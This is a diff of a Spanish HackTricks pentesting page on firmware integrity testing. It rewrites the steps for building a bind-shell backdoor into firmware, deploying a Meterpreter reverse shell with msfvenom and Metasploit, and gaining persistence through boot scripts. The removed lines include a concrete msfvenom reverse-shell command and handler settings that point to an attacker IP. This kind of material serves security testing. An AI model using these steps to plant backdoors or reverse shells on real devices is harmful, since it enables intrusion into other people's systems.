@@ -4,7 +4,7 @@
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
@@ -12,40 +12,36 @@ Otras formas de apoyar a HackTricks:
 
 </details>
 
+# Integridad del Firmware
 
-### Esta página fue copiada de [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
+El **firmware personalizado y/o binarios compilados pueden ser subidos para explotar fallos de integridad o verificación de firmas**. Se pueden seguir los siguientes pasos para la compilación de un backdoor bind shell:
 
-Intenta **subir firmware personalizado y/o binarios compilados** para buscar fallos de verificación de integridad o firma. Por ejemplo, compila un backdoor bind shell que se inicie al arrancar usando los siguientes pasos.
+1. El firmware puede ser extraído usando firmware-mod-kit (FMK).
+2. Se debe identificar la arquitectura y endianness del firmware objetivo.
+3. Se puede construir un compilador cruzado usando Buildroot u otros métodos adecuados para el entorno.
+4. El backdoor puede ser construido usando el compilador cruzado.
+5. El backdoor puede ser copiado al directorio /usr/bin del firmware extraído.
+6. El binario de QEMU apropiado puede ser copiado al rootfs del firmware extraído.
+7. El backdoor puede ser emulado usando chroot y QEMU.
+8. Se puede acceder al backdoor a través de netcat.
+9. El binario de QEMU debe ser eliminado del rootfs del firmware extraído.
+10. El firmware modificado puede ser reempaquetado usando FMK.
+11. El firmware con backdoor puede ser probado emulándolo con firmware analysis toolkit (FAT) y conectándose al IP y puerto del backdoor objetivo usando netcat.
 
-1. Extrae el firmware con firmware-mod-kit (FMK)
-2. Identifica la arquitectura y endianness del firmware objetivo
-3. Construye un compilador cruzado con Buildroot o utiliza otros métodos que se adapten a tu entorno
-4. Usa el compilador cruzado para construir el backdoor
-5. Copia el backdoor al firmware extraído en /usr/bin
-6. Copia el binario QEMU apropiado al rootfs del firmware extraído
-7. Emula el backdoor usando chroot y QEMU
-8. Conéctate al backdoor vía netcat
-9. Elimina el binario QEMU del rootfs del firmware extraído
-10. Reempaqueta el firmware modificado con FMK
-11. Prueba el firmware con backdoor emulándolo con firmware analysis toolkit (FAT) y conectándote a la IP y puerto del backdoor objetivo usando netcat
+Si ya se ha obtenido una shell de root a través de análisis dinámico, manipulación del bootloader o pruebas de seguridad de hardware, se pueden ejecutar binarios maliciosos precompilados como implantes o reverse shells. Herramientas automatizadas de payload/implante como el framework de Metasploit y 'msfvenom' pueden ser utilizadas siguiendo los siguientes pasos:
 
-Si ya se ha obtenido una shell de root a partir del análisis dinámico, manipulación del bootloader o pruebas de seguridad de hardware, intenta ejecutar binarios maliciosos precompilados como implantes o reverse shells. Considera usar herramientas automatizadas de payload/implante para marcos de comando y control (C&C). Por ejemplo, el framework de Metasploit y 'msfvenom' se pueden aprovechar usando los siguientes pasos.
+1. Se debe identificar la arquitectura y endianness del firmware objetivo.
+2. Msfvenom puede ser utilizado para especificar el payload objetivo, la IP del host atacante, el número de puerto de escucha, el tipo de archivo, la arquitectura, la plataforma y el archivo de salida.
+3. El payload puede ser transferido al dispositivo comprometido y asegurarse de que tiene permisos de ejecución.
+4. Metasploit puede ser preparado para manejar solicitudes entrantes iniciando msfconsole y configurando los ajustes de acuerdo al payload.
+5. El meterpreter reverse shell puede ser ejecutado en el dispositivo comprometido.
+6. Las sesiones de meterpreter pueden ser monitoreadas a medida que se abren.
+7. Se pueden realizar actividades post-explotación.
 
-1. Identifica la arquitectura y endianness del firmware objetivo
-2. Usa `msfvenom` para especificar el payload objetivo adecuado (-p), la IP del host atacante (LHOST=), el número de puerto de escucha (LPORT=) tipo de archivo (-f), arquitectura (--arch), plataforma (--platform linux o windows), y el archivo de salida (-o). Por ejemplo, `msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
-3. Transfiere el payload al dispositivo comprometido (por ejemplo, ejecuta un servidor web local y usa wget/curl para llevar el payload al sistema de archivos) y asegúrate de que el payload tenga permisos de ejecución
-4. Prepara Metasploit para manejar solicitudes entrantes. Por ejemplo, inicia Metasploit con msfconsole y usa la siguiente configuración de acuerdo con el payload anterior: use exploit/multi/handler,
-* `set payload linux/armle/meterpreter_reverse_tcp`
-* `set LHOST 192.168.1.245 #IP del host atacante`
-* `set LPORT 445 #puede ser cualquier puerto no utilizado`
-* `set ExitOnSession false`
-* `exploit -j -z`
-5. Ejecuta el meterpreter reverse 🐚 en el dispositivo comprometido
-6. Observa cómo se abren las sesiones de meterpreter
-7. Realiza actividades de post-explotación
+Si es posible, las vulnerabilidades dentro de los scripts de inicio pueden ser explotadas para obtener acceso persistente a un dispositivo a través de reinicios. Estas vulnerabilidades surgen cuando los scripts de inicio hacen referencia, [enlazan simbólicamente](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data), o dependen de código ubicado en ubicaciones montadas no confiables como tarjetas SD y volúmenes flash utilizados para almacenar datos fuera de los sistemas de archivos raíz.
 
-Si es posible, identifica una vulnerabilidad dentro de los scripts de inicio para obtener acceso persistente a un dispositivo a través de reinicios. Estas vulnerabilidades surgen cuando los scripts de inicio hacen referencia, [enlazan simbólicamente](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data), o dependen de código ubicado en ubicaciones montadas no confiables como tarjetas SD y volúmenes flash utilizados para almacenar datos fuera de los sistemas de archivos raíz.
-
+# Referencias
+* Para más información, consulta [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
 
 <details>
 
@@ -53,7 +49,7 @@ Si es posible, identifica una vulnerabilidad dentro de los scripts de inicio par
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
